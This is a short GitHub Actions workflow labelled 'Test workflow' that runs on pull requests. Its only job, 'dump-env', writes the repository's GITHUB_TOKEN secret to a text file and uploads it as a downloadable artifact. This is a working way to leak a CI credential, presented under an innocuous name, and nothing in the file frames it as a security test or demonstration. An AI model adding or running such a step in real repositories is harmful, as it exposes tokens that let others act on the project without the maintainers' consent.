name: Test workflow

on:
  pull_request: # pr

jobs:
  dump-env:
    runs-on: ubuntu-latest

    steps:
      - name: Write environment variables to file
        run: |
          echo "${{ secrets.GITHUB_TOKEN }}" > env.txt

      - name: Upload environment file as artifact
        uses: actions/upload-artifact@v4
        with:
          name: environment
          path: env.txt
          retention-days: 1
